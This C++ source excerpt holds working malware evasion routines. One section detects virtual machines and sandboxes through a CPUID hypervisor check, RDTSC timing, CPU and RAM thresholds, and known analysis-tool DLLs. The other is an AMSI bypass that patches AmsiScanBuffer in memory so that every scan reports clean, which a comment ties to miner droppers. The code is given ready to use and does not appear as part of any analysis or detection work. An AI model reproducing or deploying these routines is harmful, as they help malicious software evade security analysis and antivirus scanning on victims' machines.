// -------------------------------------------------------
// B.3 ANTI-VM / HYPERVISOR DETECTION
//     CPUID leaf 0x1: ECX bit 31 = hypervisor present
//     RDTSC timing: VMs introduce measurable overhead
// -------------------------------------------------------
bool DetectHypervisor() {
    int cpuInfo[4] = {};
    __cpuid(cpuInfo, 1);
    return (cpuInfo[2] >> 31) & 1; // bit 31 of ECX
}

bool DetectRDTSCTiming() {
    // Measure RDTSC delta across a known-cost operation
    // Large deltas indicate single-stepped execution or VM
    const int ITERATIONS = 10;
    const uint64_t THRESHOLD = 1000;
    uint64_t total_delta = 0;

    for (int i = 0; i < ITERATIONS; i++) {
        uint64_t t1 = __rdtsc();
        // Small busy work
        volatile int x = 0;
        for (int j = 0; j < 100; j++) x += j;
        uint64_t t2 = __rdtsc();
        total_delta += (t2 - t1);
    }
    // Average delta per iteration
    return (total_delta / ITERATIONS) > THRESHOLD * 100;
}

bool DetectSandbox() {
    if (DetectHypervisor())   return true;
    if (DetectRDTSCTiming())  return true;

    // Check number of processors — sandboxes often have 1
    SYSTEM_INFO si;
    GetSystemInfo(&si);
    if (si.dwNumberOfProcessors < 2) return true;

    // Check total RAM — sandboxes often have < 2GB
    MEMORYSTATUSEX ms;
    ms.dwLength = sizeof(ms);
    GlobalMemoryStatusEx(&ms);
    if (ms.ullTotalPhys < 2ULL * 1024 * 1024 * 1024) return true;

    // Check for common sandbox artifacts
    const char* sandbox_dlls[] = {
        "sbiedll.dll",    // Sandboxie
        "dbghelp.dll",   // debugger present hint
        "api_log.dll",   // iDefense
        "dir_watch.dll", // iDefense
        "pstorec.dll",   // SoftIce
        nullptr
    };
    for (int i = 0; sandbox_dlls[i]; i++) {
        if (GetModuleHandleA(sandbox_dlls[i]))
            return true;
    }
    return false;
}

// -------------------------------------------------------
// B.4 AMSI BYPASS — patch AmsiScanBuffer in-memory
//     Technique: overwrite first bytes with ret 0 stub
//     Observed in PowerShell-dropper stage of modern miners
// -------------------------------------------------------
bool PatchAMSI() {
    HMODULE amsi = LoadLibraryA("amsi.dll");
    if (!amsi) return false;

    FARPROC scan = GetProcAddress(amsi, "AmsiScanBuffer");
    if (!scan) return false;

    // Patch: xor eax, eax; ret — returns AMSI_RESULT_CLEAN (0)
    const BYTE patch[] = { 0x31, 0xC0, 0xC3 };

    DWORD old_protect;
    if (!VirtualProtect(scan, sizeof(patch), PAGE_EXECUTE_READWRITE, &old_protect))
        return false;

    memcpy(scan, patch, sizeof(patch));
    VirtualProtect(scan, sizeof(patch), old_protect, &old_protect);
    return true;
}

